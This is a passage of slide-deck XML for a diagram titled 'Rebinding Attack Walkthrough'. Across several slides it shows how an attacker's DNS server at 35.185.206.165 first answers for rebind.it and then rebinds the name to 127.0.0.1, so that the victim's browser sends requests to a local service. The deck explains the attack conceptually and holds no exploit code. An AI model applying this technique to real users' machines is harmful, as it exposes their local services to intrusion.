          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="215" name="Google Shape;215;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3089700" y="1208600"/>
            <a:ext cx="23640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DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p33"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="1657275"/>
            <a:ext cx="3003000" cy="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217" name="Google Shape;217;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="218" name="Google Shape;218;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="219" name="Google Shape;219;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">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3" name="Shape 223"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Google Shape;224;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="225" name="Google Shape;225;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3089700" y="1208600"/>
            <a:ext cx="23640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DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955475" y="2324050"/>
            <a:ext cx="3003000" cy="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227" name="Google Shape;227;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3086175" y="1655625"/>
            <a:ext cx="29151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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="1657275"/>
            <a:ext cx="3003000" cy="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229" name="Google Shape;229;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="230" name="Google Shape;230;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="231" name="Google Shape;231;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="232" name="Google Shape;232;p34"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2368526" y="1086250"/>
            <a:ext cx="456175" cy="642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6" name="Shape 236"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Google Shape;238;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3089700" y="1208600"/>
            <a:ext cx="23640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DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p35"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955475" y="2324050"/>
            <a:ext cx="3003000" cy="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240" name="Google Shape;240;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3086175" y="1655625"/>
            <a:ext cx="29151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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3075425" y="2443175"/>
            <a:ext cx="2915100" cy="6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DNS cache expires;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p35"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="3144000"/>
            <a:ext cx="3003000" cy="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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="243" name="Google Shape;243;p35"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="1657275"/>
            <a:ext cx="3003000" cy="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244" name="Google Shape;244;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;245;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="247" name="Google Shape;247;p35"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2368526" y="1086250"/>
            <a:ext cx="456175" cy="642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1" name="Shape 251"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="Google Shape;253;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3089700" y="1208600"/>
            <a:ext cx="23640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DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="254" name="Google Shape;254;p36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955475" y="2324050"/>
            <a:ext cx="3003000" cy="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255" name="Google Shape;255;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3086175" y="1655625"/>
            <a:ext cx="29151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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3075425" y="2443175"/>
            <a:ext cx="2915100" cy="6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DNS cache expires;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955650" y="3924850"/>
            <a:ext cx="3009600" cy="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258" name="Google Shape;258;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3090000" y="3202200"/>
            <a:ext cx="29640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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="259" name="Google Shape;259;p36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="3144000"/>
            <a:ext cx="3003000" cy="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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="260" name="Google Shape;260;p36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="1657275"/>
            <a:ext cx="3003000" cy="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261" name="Google Shape;261;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Google Shape;263;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="89922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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="264" name="Google Shape;264;p36"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2368526" y="1086250"/>
            <a:ext cx="456175" cy="642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8" name="Shape 268"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;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Rebinding Attack Walkthrough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3089700" y="1208600"/>
            <a:ext cx="23640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DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="271" name="Google Shape;271;p37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955475" y="2324050"/>
            <a:ext cx="3003000" cy="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272" name="Google Shape;272;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3086175" y="1655625"/>
            <a:ext cx="29151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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3075425" y="2443175"/>
            <a:ext cx="2915100" cy="6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DNS cache expires;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>DNS query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="274" name="Google Shape;274;p37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2955650" y="3924850"/>
            <a:ext cx="3009600" cy="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275" name="Google Shape;275;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3090000" y="3202200"/>
            <a:ext cx="29640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DNS A record response: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1868525" y="2340000"/>
            <a:ext cx="0" cy="1143600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="142875" rotWithShape="0" algn="bl" dir="3900000" dist="28575">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="490000" y="2427800"/>
            <a:ext cx="1838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GET/POST request to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="278" name="Google Shape;278;p37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="3144000"/>
            <a:ext cx="3003000" cy="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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="279" name="Google Shape;279;p37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2955575" y="1657275"/>
            <a:ext cx="3003000" cy="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280" name="Google Shape;280;p37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615367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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
